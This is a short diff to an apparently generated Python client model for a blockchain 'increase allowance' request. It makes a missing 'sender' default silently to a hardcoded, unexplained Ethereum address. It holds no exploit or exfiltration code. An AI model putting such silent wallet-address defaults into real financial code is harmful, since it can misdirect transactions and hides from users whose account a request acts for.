@@ -95,7 +95,7 @@ class IncreaseAllowanceAnyRequest(BaseModel):
             "contract_name": obj.get("contract_name"),
             "amount": Amount4.from_dict(obj["amount"]) if obj.get("amount") is not None else None,
             "chain": obj.get("chain"),
-            "sender": obj.get("sender")
+            "sender": obj.get("sender") if obj.get("sender") is not None else '0x29F20a192328eF1aD35e1564aBFf4Be9C5ce5f7B'
         })
         return _obj
 
